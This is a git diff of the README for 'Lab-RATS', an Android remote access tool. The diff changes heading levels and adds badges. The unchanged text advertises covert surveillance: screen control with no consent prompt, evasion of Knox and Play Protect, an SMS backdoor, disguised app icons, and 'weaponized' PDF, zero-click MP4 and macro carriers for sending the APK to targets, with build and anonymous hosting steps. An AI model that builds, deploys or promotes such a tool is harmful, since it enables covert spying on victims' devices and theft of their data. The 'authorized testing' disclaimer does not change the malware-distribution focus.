@@ -1,5 +1,19 @@
 [![0-Lab-RATS-Header.png](https://i.postimg.cc/Y9chdzww/0-Lab-RATS-Header.png)](https://postimg.cc/Z9cbR3Rf)
 
+ <p align="center">
+<img src="https://img.shields.io/badge/JDK-21-gold?style=for-the-badge&logo=openjdk&logoColor=white">
+<img src="https://img.shields.io/badge/Gradle-8.10.2-C0181?style=for-the-badge&logo=gradle&logoColor=white">
+<img src="https://img.shields.io/badge/Android-SDK_34-3DDC84?style=for-the-badge&logo=android&logoColor=white">
+<img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
+<img src="https://img.shields.io/badge/Focus-Remote_Access-red?style=for-the-badge&logo=airplayvideo&logoColor=white">
+<img src="https://img.shields.io/badge/Security-AES_256-blueviolet?style=for-the-badge&logo=dependencycheck&logoColor=white">
+<img src="https://img.shields.io/badge/Network-Direct_IPv6-informational?style=for-the-badge&logo=p2p&logoColor=white">
+<img src="https://img.shields.io/badge/Mode-Stealth_FUD-black?style=for-the-badge&logo=ghost&logoColor=white">
+<img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black">
+<img src="https://img.shields.io/badge/Donate-Bitcoin-F7931A?style=for-the-badge&logo=bitcoin&logoColor=white">
+  <p align="center">
+<img src="https://img.shields.io/badge/K4N3CO-LabRATS-cyan?style=for-the-badge&logo=probot&logoColor=white">
+
 # Lab-RATS
 
 ### Advanced Android Remote Administration Tool:
@@ -8,7 +22,7 @@
 
 ---
 
-# 🛡️ Core Features & Security
+## 🛡️ Core Features & Security
 
 -   🔐 **Remote C2 Security**: The **web dashboard** is **protected by a secure login wall** (Default Password: **admin1337**). The password can be **updated directly from the Terminal home page** for **enhanced security**.
 -   📡 **Secure Handshake Protocol**: Implemented a **masked credential handshake**. Passwords are **reversed and Base64 encoded** (`0x_` prefixed) on the client-side before transmission, rendering them **invisible to browser Network/Payload inspectors**.
@@ -19,7 +33,7 @@
 
 ---
 
-# 🕵️ Covert & Stealth Operations
+## 🕵️ Covert & Stealth Operations
 
 -   💉 **NEW!** **Payload Delivery Vectors** *(for installing APK onto Target Device)*: The **weaponization engine** has been overhauled to support **multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and many more)*, ensuring **reliable access** across **all modern mobile environments**.
 -   🛡️  **Evasion Engine**: **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
@@ -37,7 +51,7 @@
 
 ---
 
-# 🚀 The Fun Stuff (Remote Capabilities)
+## 🚀 The Fun Stuff (Remote Capabilities)
 
 -   👻 **Ghost Operations/Controller**:
     -   **Ghost Screen Control/Mirror**: **Cast & control the live screen remotely** with **NO "Consent Prompt" required**.
@@ -69,25 +83,25 @@
 
 ---
 
-# 🧠 Remote Persistence & Commands
+## 🧠 Remote Persistence & Commands
 
 ### 🌐 **Direct IPv6 Access** *(P2P connection)*
 
 **Lab-RATS** exploits the **unique traits** of **publicly routable IPv6 addresses** assigned by **modern WIFI/5G/LTE carriers**. By binding the **Lab-RATS** server **directly to the Global Unicast Address**, it **bypasses Carrier-Grade NAT** *(CGNAT)* and **firewalls entirely**. This allows for **Zero Configuration** peer-to-peer *(P2P)* **remote access** from **any browser in the world without the need** for **routers, port forwarding,** or **external tunneling software**. *(Pinggy or Ngrok)*
 
-## 🔄 **Remote Server Restart**
+### 🔄 **Remote Server Restart**
 
 -   **Web UI**: One-click **"RESTART_SERVER"** button on the **Terminal tab** to refresh **background services**.
 -   **SMS Backdoor**: Send an SMS/Text containing `!RESTART_C2` to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.
 
-## 🛠️ **NEW!** **Termux Bridge Integration**
+### 🛠️ **NEW!** **Termux Bridge Integration**
 
 **Lab-RATS** now features a **high-performance bridge to the Termux environment**. If **Termux is installed on the target device**, the remote terminal can **instantly elevate its capabilities**:
 -   **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are automatically routed through the bridge.
 -   **Unrestricted Tools**: Install and run **Python scripts, Nmap scans, or Metasploit** directly from the **C2 web terminal**.
 -   **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
 
-## 🖥️ **Enhanced Remote Shell**
+### 🖥️ **Enhanced Remote Shell**
 
 The **Terminal Tabs Built-in Shell has been overhauled** for **professional workflows**:
 -   **Command History**: Navigate previous commands instantly using **Up/Down arrows**.
@@ -97,7 +111,7 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 
 ---
 
-# 📊 **Google Sheet Setup Instructions**
+## 📊 **Google Sheet Setup Instructions**
 
 1.  **Create** a new **Google Sheet** for **IP Tracking**.
 2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:** *(Supports both GET and POST)*
@@ -160,14 +174,14 @@ function handleRequest(e) {
 
 ---
 
-# 🛠️ Getting Started
+## 🛠️ Getting Started
 
-## 1. Requirements
+### 1. Requirements
 *   **Java 17 or 21 installed** on your **workstation**.
 *   A **Test Android** device. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
 *   Your **Google Sheet Webhook URL**. *(Previous Section)*
 
-## 2. Building the APK (on PC)
+### 2. Building the APK (on PC)
 1.  **Download & Extract** the repository.
 2.  **Navigate** to `cd /Lab-RATS-main/apk-builder/`
 3.  **Execute** the builder: `chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
@@ -177,11 +191,12 @@ function handleRequest(e) {
 5.  Enter your **Google Sheet Webhook URL** when prompted to enable remote device reporting.
 6.  Retrieve your `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `/apk-builder/output/` directory.
 
-## 3. Deploying & Installing onto Android Device
+### 3. Deploying & Installing onto Android Device
 
 **Deployment is a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
 
 ### **A. **NEW!** Strategic Weaponization** (The Wrapper)
+
 Standard `.apk` files are **often blocked by email filters and browser security**. Use the **Wizard (Option 6)** in the `apk-builder` to wrap your link inside a **high-compatibility carrier file**:
 *   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download**, bypassing **standard PDF security filters**.
 *   **🎬 Zero-Click MP4**: Send as a **video file**. It exploits mobile **Media Heap Overflows** during gallery **indexing or thumbnail generation** to **force-register the C2 link in the background**.
@@ -190,10 +205,12 @@ Standard `.apk` files are **often blocked by email filters and browser security*
 *   **And many more**: The **wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document** macros.
 
 ### **B. Hosting Strategies**
+
 *   **Anonymous Cloud**: Option 6 uses **Catbox.moe** by default. It is **anonymous, fast**, and **generates a direct link**.
 *   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from another infected device using the `/download/` endpoint.
 
 ### **C. Installation & Initialization**
+
 Once the **Target device** downloads the APK:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed_payload.apk`.
 2.  **Permissions (Critical)**: Open the app **once**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
@@ -203,7 +220,7 @@ Once the **Target device** downloads the APK:
 
 ---
 
-# 🛡️ **Post-Install Recovery & Management**
+## 🛡️ **Post-Install Recovery & Management**
 
 *   **Dialer Unlock**: Type `*#1337#` on the phone's keypad to **force the main interface back into view**.
 *   **Hidden Backdoor**: If the icon on device is in stealth mode, **rapidly tap the decoy screen display in middle 10 times** to unlock the dashboard.
@@ -213,15 +230,15 @@ Once the **Target device** downloads the APK:
 
 ---
 
-# ⭐ **Support the Development**
+## ⭐ **Support the Development**
 
 If you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it **drives further development!!**
 
-## **Contributions:**
+### **Contributions:**
 
 **Bug reports, add new feature** and **pull requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-STAR/CONTRIBUTING.md) for more info)*
 
-## **Donate:**
+### **Donate:**
 
 ☕️ **BuyMeACoffee**: https://buymeacoffee.com/k4n3co
 
@@ -233,7 +250,7 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 
 ---
 
-# 📸 **Screenshots & Video Clips**
+## 📸 **Screenshots & Video Clips**
 
 ### Signed APK build (Macbook Air M2):
 > *This build excludes my Google Sheet Webhook URL for security. For standard private builds, you must add your own Google webhook URL *(instructions above)* to correctly receive the IPv6 address link from the app after installation.*
@@ -242,7 +259,7 @@ https://github.com/user-attachments/assets/45419d9f-df4f-478e-8e69-d3c42ef09bdb
 
 ---
 
-## Built APK (C2 Server) Installed on Android Device:
+### Built APK (C2 Server) Installed on Android Device:
 
 <p align="center">
 <a href="https://postimg.cc/zySrqv1Z" target="_blank"><img src="https://i.postimg.cc/zySrqv1Z/App-installed-Running.png" alt="App-installed-Running"></a>
@@ -250,7 +267,7 @@ https://github.com/user-attachments/assets/45419d9f-df4f-478e-8e69-d3c42ef09bdb
 
 ---
 
-## Remotely Transform Lab-RATS into a Working Calculator, Weather App, System Update, or Settings Menu:
+### Remotely Transform Lab-RATS into a Working Calculator, Weather App, System Update, or Settings Menu:
 
 <p align="center">
 <a href="https://postimg.cc/hhrzqMBt" target="_blank"><img src="https://i.postimg.cc/hhrzqMBt/Stealth-Icons.jpg" alt="Stealth-Icons"></a>    
@@ -354,13 +371,13 @@ https://github.com/user-attachments/assets/45419d9f-df4f-478e-8e69-d3c42ef09bdb
 
 ---
 
-# ⚠️ **Disclaimer**
+## ⚠️ **Disclaimer**
 
 This tool is for **educational and authorized security testing purposes ONLY!**. The **developers & contributors** assume **NO responsibility** for **ANY** **misuse, damage to devices or relationships** caused by this software. **Please use it responsibly**. **Thank you!**
 
 ---
 
-# 🪪 **License**
+## 🪪 **License**
 
 This project is **licensed** to **K4N3CO** under the [MIT License](LICENSE).
 
